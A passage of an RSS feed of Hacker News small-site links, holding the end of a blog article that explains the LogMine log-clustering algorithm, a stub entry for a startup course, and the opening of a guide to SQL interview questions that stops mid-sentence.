      <th>&nbsp;</th>
      <th>&nbsp;</th>
      <th>&nbsp;</th>
      <th>&nbsp;</th>
      <th><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>i</mi><mi>e</mi><mi>l</mi><msub><mi>d</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">Field_n</annotation></semantics></math></span></span></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>&lt;time&gt;</code></td>
      <td>-</td>
      <td>[DEBUG]</td>
      <td>-</td>
      <td>User</td>
      <td>123</td>
      <td>disconnected</td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td><code>&lt;time&gt;</code></td>
      <td>-</td>
      <td>[DEBUG]</td>
      <td>-</td>
      <td>User</td>
      <td>123</td>
      <td>disconnected</td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td><code>&lt;time&gt;</code></td>
      <td>-</td>
      <td>[ERROR]</td>
      <td>-</td>
      <td>An</td>
      <td>error</td>
      <td>occurred</td>
      <td>while</td>
      <td>…</td>
    </tr>
    <tr>
      <td><code>&lt;time&gt;</code></td>
      <td>-</td>
      <td>[DEBUG]</td>
      <td>-</td>
      <td>User</td>
      <td>789</td>
      <td>disconnected</td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
  </tbody>
</table>

<p>I stopped at the word <code>while</code> for readability reasons, but there’s no limit to
the number of fields.</p>

<h4 id="identifying-dense-clusters">Identifying dense clusters</h4>

<p>Once this transformation is done, we will reduce these patterns into dense
clusters. Identifying dense clusters can be seen as a special use-case of the
clustering algorithm: we identify clusters but <strong>we skip the pattern extraction
step as these patterns are nearly identical</strong>.</p>

<p>As such, I’ll first introduce the clustering algorithm and the notion of
distance between patterns.</p>

<h3 id="grouping-patterns-into-clusters">Grouping patterns into clusters</h3>

<p>The clustering algorithm takes a list of patterns and identifies patterns that
are close to each other. Both the Tony Dinh’s implementation and the paper uses
the distance defined as:</p>

<p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>Dist</mtext><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><mi>Q</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><mo>−</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mrow><mtext>Min</mtext><mo stretchy="false">(</mo><mtext>len</mtext><mo stretchy="false">(</mo><mi>P</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mtext>len</mtext><mo stretchy="false">(</mo><mi>Q</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow></munderover><mfrac><mrow><mtext>Score</mtext><mo stretchy="false">(</mo><msub><mi>P</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>Q</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><mrow><mtext>Max</mtext><mo stretchy="false">(</mo><mtext>len</mtext><mo stretchy="false">(</mo><mi>P</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mtext>len</mtext><mo stretchy="false">(</mo><mi>Q</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">\text{Dist}(P,Q) = 1 -
\sum_{i=1}^{\text{Min}(\text{len}(P),\text{len}(Q))}{\frac{\text{Score}(P_i,Q_i)}{\text{Max}(\text{len}(P),\text{len}(Q))}}</annotation></semantics></math></span></span></span></p><p>With P and Q, two patterns.</p>

<p>If the distance between the two patterns is inferior to a threshold <code>MaxDist</code>
defined internally, then the two patterns are considered a member of the same
cluster.</p>

<div>
  <p>This comparison process can be optimized by skipping unnecessary work if the
sum is already greater than our <code>MaxDist</code>.</p>

  <p>This is valid because the elements inside the sum can’t be negative.</p>
</div>

<p>The scoring function proposed in the paper allows for tweaking weights depending
on the field type.</p>

<p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>Score</mtext><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>k</mi><mn>1</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><mi>x</mi><mo>=</mo><mi>y</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>and&nbsp;both&nbsp;are&nbsp;fixed&nbsp;values</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>k</mi><mn>2</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><mi>x</mi><mo>=</mo><mi>y</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>and&nbsp;both&nbsp;are&nbsp;variable</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>otherwise</mtext></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">\text{Score}(x, y) =
\begin{cases}
  k1 &amp;\text{if } x=y &amp;\text{and both are fixed values}\\
  k2 &amp;\text{if } x=y &amp;\text{and both are variable} \\
  0 &amp;\text{otherwise}
\end{cases}</annotation></semantics></math></span></span></span></p><p>In order to keep performance, the scoring function can’t return a negative
value. Therefore <code>k1</code> and <code>k2</code> can’t be negative.</p>

<div>
  <p><strong>Note</strong></p>

  <p>The definition of this scoring function seems to have left some place for interpretation:</p>
  <ul>
    <li>Tony Dinh’s implementation <a href="https://github.com/trungdq88/logmine/blob/a7595c6a0b313b43969199c18465cc8bec3b57d1/src/line_scorer.py#L29">checks for equality</a>
if both value are fixed values.</li>
    <li><a href="https://github.com/logpai/logparser/blob/master/logparser/LogMine/LogMine.py">LogPai’s LogParser</a> dropped the concept of variables and uses k2 to tune wildcards weight</li>
  </ul>

</div>

<p>Let’s define <code>k1=1</code> and <code>k2=1</code>, these are the weight used by Tony Dinh’s
implementation and recommended by the original paper.</p>

<h4 id="applying-the-clustering-algorithm">Applying the clustering algorithm</h4>

<p>For this example, I will use the original paper recommendation (<code>MaxDist=0.01</code>).
The MaxDist parameter is used to tune the algorithm sensitivity: the higher
<code>MaxDist</code>, the more patterns are detected.
If <code>MaxDist</code> is too high, patterns are grouped into very large clusters and
pattern extraction become meaningless.</p>

<table>
  <thead>
    <tr>
      <th>Fields from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>o</mi><msub><mi>g</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">Log_1</annotation></semantics></math></span></span></th>
      <th>Fields from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">Log_2</annotation></semantics></math></span></span></th>
      <th>Score</th>
      <th>Sum (Total)</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>&lt;time&gt;</code></td>
      <td><code>&lt;time&gt;</code></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{7}</annotation></semantics></math></span></span></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{7}</annotation></semantics></math></span></span></td>
    </tr>
    <tr>
      <td><code>-</code></td>
      <td><code>-</code></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{7}</annotation></semantics></math></span></span></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>2</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{2}{7}</annotation></semantics></math></span></span></td>
    </tr>
    <tr>
      <td><code>[DEBUG]</code></td>
      <td><code>[DEBUG]</code></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{7}</annotation></semantics></math></span></span></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>3</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{3}{7}</annotation></semantics></math></span></span></td>
    </tr>
    <tr>
      <td><code>-</code></td>
      <td><code>-</code></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{7}</annotation></semantics></math></span></span></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>4</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{4}{7}</annotation></semantics></math></span></span></td>
    </tr>
    <tr>
      <td><code>User</code></td>
      <td><code>User</code></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{7}</annotation></semantics></math></span></span></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>5</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{5}{7}</annotation></semantics></math></span></span></td>
    </tr>
    <tr>
      <td><code>123</code></td>
      <td><code>123</code></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{7}</annotation></semantics></math></span></span></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>6</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{6}{7}</annotation></semantics></math></span></span></td>
    </tr>
    <tr>
      <td><code>disconnected</code></td>
      <td><code>disconnected</code></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{7}</annotation></semantics></math></span></span></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>7</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{7}{7}</annotation></semantics></math></span></span></td>
    </tr>
  </tbody>
</table>

<p>The two logs belong to the same cluster as <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>−</mo><mfrac><mn>7</mn><mn>7</mn></mfrac><mo>&lt;</mo><mtext>MaxDist</mtext></mrow><annotation encoding="application/x-tex">1 - \frac{7}{7} &lt; \text{MaxDist}</annotation></semantics></math></span></span>.</p>

<table>
  <thead>
    <tr>
      <th>Fields from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>o</mi><msub><mi>g</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">Log_1</annotation></semantics></math></span></span></th>
      <th>Fields from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>o</mi><msub><mi>g</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">Log_3</annotation></semantics></math></span></span></th>
      <th>Score</th>
      <th>Sum (Total)</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>&lt;time&gt;</code></td>
      <td><code>&lt;time&gt;</code></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mn>11</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{11}</annotation></semantics></math></span></span></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mn>11</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{11}</annotation></semantics></math></span></span></td>
    </tr>
    <tr>
      <td><code>-</code></td>
      <td><code>-</code></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mn>11</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{11}</annotation></semantics></math></span></span></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>2</mn><mn>11</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{2}{11}</annotation></semantics></math></span></span></td>
    </tr>
    <tr>
      <td><code>[DEBUG]</code></td>
      <td><code>[ERROR]</code></td>
      <td>0</td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>2</mn><mn>11</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{2}{11}</annotation></semantics></math></span></span></td>
    </tr>
    <tr>
      <td><code>-</code></td>
      <td><code>-</code></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mn>11</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{11}</annotation></semantics></math></span></span></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>3</mn><mn>11</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{3}{11}</annotation></semantics></math></span></span></td>
    </tr>
    <tr>
      <td><code>User</code></td>
      <td><code>An</code></td>
      <td>0</td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>3</mn><mn>11</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{3}{11}</annotation></semantics></math></span></span></td>
    </tr>
    <tr>
      <td><code>123</code></td>
      <td><code>error</code></td>
      <td>0</td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>3</mn><mn>11</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{3}{11}</annotation></semantics></math></span></span></td>
    </tr>
    <tr>
      <td><code>disconnected</code></td>
      <td><code>occurred</code></td>
      <td>0</td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>3</mn><mn>11</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{3}{11}</annotation></semantics></math></span></span></td>
    </tr>
  </tbody>
</table>

<p>The two logs do not belong to the same cluster as <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>−</mo><mfrac><mn>3</mn><mn>11</mn></mfrac><mo>&gt;</mo><mtext>MaxDist</mtext></mrow><annotation encoding="application/x-tex">1 - \frac{3}{11} &gt; \text{MaxDist}</annotation></semantics></math></span></span>.</p>

<div>
  <p><strong>Note</strong></p>

  <p>As we are using <code>MaxDist=0.01</code>, and since the logs in my example are very short,
we will only identify logs that are identical. For this reason, <strong>we can use the
clustering algorithm to identify dense clusters</strong> by skipping the pattern
recognition step.</p>
</div>

<h3 id="pattern-detection">Pattern detection</h3>

<p>In sequential (as opposed to MapReduce) mode, each time a pattern is inserted
in a cluster, LogMine will try to extract patterns from them. LogMine knows
only how to identify two types:</p>
<ul>
  <li>Fixed values</li>
  <li>Wildcards</li>
</ul>

<p>While it seems rather strict, remember that the early pattern detection during
tokenization already took care of identifying user-defined patterns.</p>

<div>
  <p>Generating the pattern each time a new pattern is added allows LogMine to only
keep one representative for each cluster. This is a very important factor to
reduce memory usage.</p>

  <p><strong>MapReduce behavior is described later in this article.</strong></p>
</div>

<p>As patterns in the same cluster can have a different number of fields, the paper
uses the <a href="https://en.wikipedia.org/wiki/Smith%E2%80%93Waterman_algorithm">Smith-Waterman</a>
algorithm to align them. The Smith-Waterman is mainly used in Bioinformatics to
align sequences. It is interesting to see an algorithm like this applied to
log pattern recognition.</p>

<p>Once the two patterns are aligned, we compare one by one the field:</p>
<ul>
  <li>If the value is equal, we assign a fixed value</li>
  <li>If the value is different, we assign a wildcard pattern</li>
</ul>

<p>The Smith-Waterman algorithm adds placeholders to align logs. These placeholders
are <strong>never equal</strong> to a field value. This means that aligned parts of a log are
always identified as wildcards.</p>

<p>The output of the pattern detection algorithm is a <strong>new list of patterns</strong>.</p>



<p>Let’s assume that the previous algorithm identified a cluster with two patterns:</p>
<div><div><pre><code>&lt;time&gt; - [DEBUG] - User 123 disconnected
&lt;time&gt; - [DEBUG] - User 789 disconnected
</code></pre></div></div>

<p>To stay consistent with how they were presented earlier, we will call them
<span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>o</mi><msub><mi>g</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">Log_1</annotation></semantics></math></span></span> and <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>o</mi><msub><mi>g</mi><mn>4</mn></msub></mrow><annotation encoding="application/x-tex">Log_4</annotation></semantics></math></span></span>.</p>

<table>
  <thead>
    <tr>
      <th><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>o</mi><msub><mi>g</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">Log_1</annotation></semantics></math></span></span></th>
      <th><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>o</mi><msub><mi>g</mi><mn>4</mn></msub></mrow><annotation encoding="application/x-tex">Log_4</annotation></semantics></math></span></span></th>
      <th>Result</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>&lt;time&gt;</code></td>
      <td><code>&lt;time&gt;</code></td>
      <td><code>&lt;time&gt;</code></td>
    </tr>
    <tr>
      <td><code>-</code></td>
      <td><code>-</code></td>
      <td><code>Fixed value</code></td>
    </tr>
    <tr>
      <td><code>[DEBUG]</code></td>
      <td><code>[DEBUG]</code></td>
      <td><code>Fixed value</code></td>
    </tr>
    <tr>
      <td><code>-</code></td>
      <td><code>-</code></td>
      <td><code>Fixed value</code></td>
    </tr>
    <tr>
      <td><code>User</code></td>
      <td><code>User</code></td>
      <td><code>Fixed value</code></td>
    </tr>
    <tr>
      <td><code>123</code></td>
      <td><code>456</code></td>
      <td><code>Wildcard</code></td>
    </tr>
    <tr>
      <td><code>disconnected</code></td>
      <td><code>disconnected</code></td>
      <td><code>Fixed value</code></td>
    </tr>
  </tbody>
</table>

<h4 id="result-of-applying-the-smith-waterman-algorithm">Result of applying the Smith-Waterman algorithm</h4>

<p>Because examples in this article would have gotten very complex, I decided to
not use non-aligned logs in my examples. However, you might be curious as to how
the Smith-Waterman works.</p>

<p>On the implementation, LogMine would have aligned the two following patterns by
adding a <code>None</code> value in a field. For instance:</p>
<div><div><pre><code>&lt;time&gt; - [DEBUG] - User 123 disconnected
&lt;time&gt; - [DEBUG] - User 123 has disconnected
</code></pre></div></div>
<p>would become:</p>
<div><div><pre><code>&lt;time&gt; - [DEBUG] - User 123 &lt;None&gt; disconnected
&lt;time&gt; - [DEBUG] - User 123 has disconnected
</code></pre></div></div>

<div>
  <p><strong>The Smith-Waterman does not understand patterns</strong>. The Smith-Waterman uses
the same scoring function as the clustering algorithm. As such, if two fields
are not equal, there is no guarantee that the placeholder will be inserted
properly.</p>

  <p>If we tweak our previous example to:</p>
  <div><div><pre><code>&lt;time&gt; - [DEBUG] - User 123 disconnected
&lt;time&gt; - [DEBUG] - User 456 has disconnected
</code></pre></div>  </div>

  <p>The Smith-Waterman algorithm would transform it to:</p>
  <div><div><pre><code>&lt;time&gt; - [DEBUG] - User &lt;None&gt; 123 disconnected
&lt;time&gt; - [DEBUG] - User 456 has disconnected
</code></pre></div>  </div>

  <p>The alignment was added <strong>before</strong> the user identifier.</p>
</div>

<h3 id="repeat-until-satisfied">Repeat until satisfied</h3>

<p>As the pattern extraction algorithm returns a list of patterns, we can relax
<code>MaxDist</code> and feed this list back into the clustering algorithm.</p>

<p>In <strong>3.4 Hierarchy of Patterns</strong>, the paper describes a process to generate a
hierarchy of possible patterns from very strict to …</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sayr.us/log-pattern-recognition/logmine/">https://sayr.us/log-pattern-recognition/logmine/</a></em></p>]]>
            </description>
            <link>https://sayr.us/log-pattern-recognition/logmine/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25710991</guid>
            <pubDate>Sun, 10 Jan 2021 05:50:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Knowable free audio course: Launch a Startup by Alexis Ohanian]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25710947">thread link</a>) | @AbdHicham
<br/>
January 9, 2021 | https://knowable.fyi/courses/how-to-start-a-business | <a href="https://web.archive.org/web/*/https://knowable.fyi/courses/how-to-start-a-business">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://knowable.fyi/courses/how-to-start-a-business</link>
            <guid isPermaLink="false">hacker-news-small-sites-25710947</guid>
            <pubDate>Sun, 10 Jan 2021 05:47:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A guide to SQL interview questions]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25709870">thread link</a>) | @data4lyfe
<br/>
January 9, 2021 | https://www.interviewquery.com/blog-sql-interview-questions/ | <a href="https://web.archive.org/web/*/https://www.interviewquery.com/blog-sql-interview-questions/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <p><strong>Table of Contents</strong></p><!--kg-card-begin: html-->
<!--kg-card-end: html--><h3 id="introduction">Introduction</h3><p>SQL is the good old friend that has always worked. It’s something you always come back to, even as Pandas, Julia, Spark, Hadoop, and NoSql attempt to dethrone and replace SQL as the new de-facto data tool.</p><p>Eventually though, they all fail in the face of the consistently reliable SQL. And that's why SQL continues to get asked in interviews. </p><blockquote><strong>A note before we start...</strong></blockquote><blockquote>This guide should be used for anyone who is preparing for an interview in which they know SQL will show up. This guide<strong> is not</strong> a search engine optimized listacle (top 50 sql questions for 2021...really?).</blockquote><blockquote>Rather, this is <strong>real advice and REAL interview questions and exercises </strong>gathered from hundreds of data scientists, engineers, and analysts. We sprinkle exercises throughout this post after learning concepts. Be sure to try attempting the questions first before we walk through solving them. &nbsp;</blockquote><blockquote>Lastly, if you enjoy this article, <strong>please give us a share</strong> and check out our <a href="https://www.interviewquery.com/courses/data-science-course">SQL course</a> that goes a little deeper with more exercises and problems. </blockquote><h2 id="1-why-does-sql-show-up-on-the-interview">1. Why does SQL show up on the interview?</h2><figure><img src="https://blog.interviewquery.com/content/images/2021/01/image-6.png" alt="" srcset="https://blog.interviewquery.com/content/images/2021/01/image-6.png 600w"></figure><p>SQL allows data scientists and engineers to do a couple of important things.</p><p>One is to <strong>effectively store and retrieve information at scale for analytics</strong>. Even though Google Sheets allows users to easily manipulate and visualize data, it cannot store and scale like a SQL database can. Other popular programs –namely Hadoop and Spark– can scale much further than SQL, but still don’t have a clean and easy-to-use language like SQL to retrieve data efficiently.</p><p>Another great thing about SQL is that understanding the fundamentals bridges the gap between <strong>engineering and data science</strong>. Knowing SQL well gives you a competitive edge over any other candidate, whether you're competing for a position as a product manager, software engineer, or even as a business analyst. Having the skillset to write and pull your own queries is like being a magician that can come up with analyses out of thin air. </p><p>And at the end of the day, you could just be really good at SQL if you wanted to and make tons of money creating ETL jobs or pulling dashboards with efficiency. That's how valued SQL is. </p><h3 id="how-often-does-sql-show-up-in-interviews">How often does SQL show up in interviews?</h3><p>One prevailing question is how often SQL shows up in interviews. </p><p>At Interview Query, we analyzed a dataset of Glassdoor data science interview experiences and responses submitted by our users. The analysis came back that SQL was asked:</p><ul><li><a href="https://www.interviewquery.com/interview-experiences/facebook/data-scientist" rel="nofollow">70% of the time during Facebook’s data science interviews</a></li><li><a href="https://www.interviewquery.com/interview-experiences/Amazon/business-analyst" rel="nofollow">94% of the time during Amazon’s business intelligence and analyst interviews</a></li></ul><figure><img src="https://blog.interviewquery.com/content/images/2021/01/image-7.png" alt="" srcset="https://blog.interviewquery.com/content/images/size/w600/2021/01/image-7.png 600w, https://blog.interviewquery.com/content/images/size/w1000/2021/01/image-7.png 1000w, https://blog.interviewquery.com/content/images/2021/01/image-7.png 1262w" sizes="(min-width: 720px) 720px"><figcaption><a href="https://www.interviewquery.com/interview-experiences/facebook/data-scientist">Skills tested in Facebook's Data Science Interview as of 2021</a></figcaption></figure><p>Due to its nature in being able to get and manipulate your own data, this is by far the most important skill now towards nabbing a data science position. And while pandas and other languages are useful, note that <a href="https://www.interviewquery.com/blog-why-your-data-scientist-interviewer-wont-ask-pandas-questions/" rel="nofollow">SQL will always be the one that matters</a>.</p><h2 id="2-strategies-for-the-live-sql-interview">2. Strategies for the live SQL interview</h2><p>Let's go over the common strategies when tackling SQL interview questions. </p><p><strong>1.Repeat the problem statement</strong></p><p>When presented with a SQL question, listen carefully to the problem description and repeat back what you think the crux of the problem is. The interviewer can then help verify if your understanding is correct.</p><p><strong>2. Understand the edge cases</strong></p><p>If time permits, write out a base case and an edge case to show that you understand the problem. For example: if the interviewer asks you to pull the average number of events per user per day, write out an example scenario where you're verifying this metric. </p><p>Do duplicate events matter? Are we looking at distinct users? These are questions we need to clarify. </p><p><strong>3. Try working backwards if the problem is tricky</strong></p><p>Sketching out what the output of the SQL question will look like is a great strategy towards solving the problem. Usually, if I know what the end output table is supposed to look like, I can work backwards from there on what functions need to be applied before. </p><p>For example, if the output looks like this:</p><pre><code>date        | average events per user
------------+-----------------------
2021-12-01  |  3.5
2021-12-02  |  4.0</code></pre><p>I know that the table before this aggregation would have to look something like this.</p><pre><code>date       | event | user_id
-----------+-------+--------
2021-12-01 | click | 1
2021-12-01 | view  | 1
......</code></pre><p>And then, I can figure out what functions I should use to get to my desired output!</p><p><strong>4. Pattern match to different functions</strong></p><p>As you practice more and more SQL exercises, what you'll find is that many SQL problems follow similar patterns. There are techniques we can use in SQL, like utilizing <code>HAVING</code> on aggregations, self-joins and cross-joins, and applying window functions. But, additionally, we'll see problems that run in a similar vein. </p><p>For example, writing a query to get the second highest salary or writing a query to isolate every fifth purchase by a user utilizes the same <code>RANK</code> function in SQL. </p><p>Understanding the commonalities between questions will help you understand the first step to solving SQL questions faster because you can re-use similar code and stitch together techniques on top of each other. </p><p><strong>5. Start writing SQL</strong></p><p>Finally, it's important to just start writing SQL. It's better to start writing an imperfect solution vs trying to perfectly understand the problem or trying to perfect the solution on the first try. </p><p>Verbalize your assumptions and what you're doing as you write SQL and your interviewer can then be put on the same page as you. </p><h2 id="3-the-7-different-sql-interview-questions">3. The 7 different SQL interview questions</h2><p>SQL questions asked during interviews can vary widely across companies, but even more so across positions. You won't see data scientists asked the same SQL questions as software engineers, and that's because data scientists have to write different types of queries compared to software engineers. </p><p>Generally, each SQL interview question can be bucketed into these categories:</p><ul><li>Definition based SQL questions</li><li>Basic SQL questions</li><li>Reporting and metrics SQL questions</li><li>Analytics SQL questions</li><li>ETL SQL questions</li><li>Database design questions</li><li>Logic based SQL questions</li></ul><p>In this next section, we'll go over which types of SQL questions are expected for different roles and what those different kinds of SQL questions are in detail. </p><h2 id="4-sql-questions-for-data-scientists-and-analysts">4. SQL questions for data scientists and analysts</h2><p>SQL interview questions for data scientists and data analysts will likely show up in three parts of the interview process: the technical round, the take-home challenge, and the onsite interview. </p><p>The technical round and take-home challenge will usually consist of SQL questions <strong>designed to filter out candidates</strong>. Since SQL is commonly used as a filter mechanism for data scientists, it's important to perform well on this part of the interview in order to demonstrate competence. </p><p>Depending on what type of data science role you're interviewing for, you'll find that most SQL questions will be split into these three types:</p><ul><li>Basic SQL Interview Questions</li><li>Reporting and Metrics SQL Interview Questions</li><li>Analytics SQL Interview Questions</li></ul><h3 id="basic-sql-interview-questions">Basic SQL Interview Questions</h3><p>Basic SQL questions are what they sound like. These questions will be generally easy and focus on assessing if you know the basics. </p><p><strong>Definition based SQL questions </strong>are grouped into this category because they're super easy to learn. All you have to do is study a list of definitions of SQL terms and applications. These questions will include understanding the differences between joins, what kinds of aggregations exist, and knowing the basic functions like <code>CASE WHEN</code> or <code>HAVING</code>. </p><p>Basic SQL interview questions that involve a user actually writing a query are slightly different. These will involve getting the <code>COUNT</code> of a table, knowing what the <code>HAVING</code> clause does, and figuring out how to utilize <code>LEFT JOIN</code> versus <code>INNER JOIN</code> to give you the values that you need.</p><blockquote>Read more on the the <a href="https://www.interviewquery.com/blog-three-sql-questions-you-must-know-to-pass/">basic concepts you need to know to pass your data science interview</a> here. </blockquote><figure><a href="https://www.interviewquery.com/blog-three-sql-questions-you-must-know-to-pass/"><div><p>Three SQL Concepts for your Data Scientist Interview</p><p>I’ve interviewed a lot of data scientist candidates and have found there are a a lot of SQL interview questions for data science that eventually boil down to three generalized types of conceptual understandings.</p><p><img src="https://blog.interviewquery.com/favicon.ico"><span>Interview Query Blog</span></p></div><p><img src="https://blog.interviewquery.com/content/images/2020/02/sql_join.jpeg"></p></a></figure><p><strong>Basic SQL Concepts to 